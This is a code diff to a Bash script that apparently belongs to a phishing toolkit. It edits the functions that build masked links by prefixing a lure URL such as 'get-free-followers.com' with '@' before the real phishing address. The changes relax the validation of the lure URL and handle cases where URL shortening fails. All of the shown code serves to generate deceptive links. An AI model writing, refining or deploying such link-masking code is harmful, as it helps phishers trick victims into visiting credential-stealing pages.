@@ -461,7 +461,7 @@ custom_mask() {
 	if [[ ${mask_op,,} == "y" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+		if [[ ${mask_url} =~ ^https?://[a-zA-Z0-9.-]+ ]]; then
 			mask=$mask_url
 			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
 		else
@@ -500,8 +500,13 @@ custom_url() {
 		fi
 
 		url="https://$url"
-		masked_url="$mask@$processed_url"
-		processed_url="https://$processed_url"
+		if [[ $processed_url != "" ]]; then
+			masked_url="$mask@$processed_url"
+			processed_url="https://$processed_url"
+		else
+			processed_url="Unable to Short URL"
+			masked_url="Unable to generate masked link"
+		fi
 	else
 		# echo "[!] No url provided / Regex Not Matched"
 		url="Unable to generate links. Try after turning on hotspot"
